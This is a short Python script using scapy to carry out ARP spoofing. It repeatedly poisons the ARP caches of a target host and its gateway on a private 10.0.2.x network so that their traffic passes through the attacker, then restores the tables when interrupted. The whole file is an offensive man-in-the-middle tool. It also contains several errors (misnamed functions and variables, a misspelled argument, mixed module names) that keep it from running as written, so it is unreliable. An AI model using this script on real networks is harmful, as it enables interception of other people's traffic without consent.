import scapy.all as sp
import time
import sys

def getMac(ip):
    arpRequest = sp.ARP(pdst=ip)
    broadcast = sp.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast/arpRequest
    answeredList = sp.erp(arpRequestBroadcast, timeout = 1, verboase = False)[0]

    return answeredList[0][1].hwsrc

def spoof(targetIP, spoofIP):
    targetMac = getMac(targetIP)
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=spoofIP)
    sp.send(packet, verbose=False)

def restore(destIP, sourceIP):
    destMAC = getMac(destIP)
    sourceMAC = getMac(sourceIP)
    packet = sp.ARP(op=2, pdst=destIP, hwdst=destMac, psrc=sourceIP, hwsrc=sourceMAC)
    sp.send(packet, count=4, verbose=False)

targetIP = "10.0.2.7"
gatewayIP = "10.0.2.1"
try:
    packetsSentCount=0
    while True:
        spoof(targetIP, gatewayIP)
        spoof(gatewayIP, targetIP)
        packetsSentCount = packetsSentCount + 2
        print("\r[=] Sent " + str(packetsSentCount)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables..... Please wait.\n")
    restore(targetIP, gatewayIP)
    restore(gatewayIP, targetIP)
